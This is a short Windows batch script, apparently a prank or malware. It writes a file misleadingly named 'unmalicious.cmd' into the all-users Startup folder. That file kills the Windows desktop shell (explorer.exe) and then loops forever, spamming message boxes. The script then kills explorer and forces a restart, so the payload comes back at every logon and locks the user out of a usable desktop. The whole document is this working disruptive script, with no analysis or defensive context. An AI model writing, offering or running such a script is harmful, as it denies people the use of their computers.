@echo off
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
echo taskkill /F /IM explorer.exe > unmalicious.cmd
echo :bru >> unmalicious.cmd
echo msg * bru >> unmalicious.cmd
echo goto bru >> unmalicious.cmd
start unmalicious.cmd
taskkill /F /IM explorer.exe
shutdown /g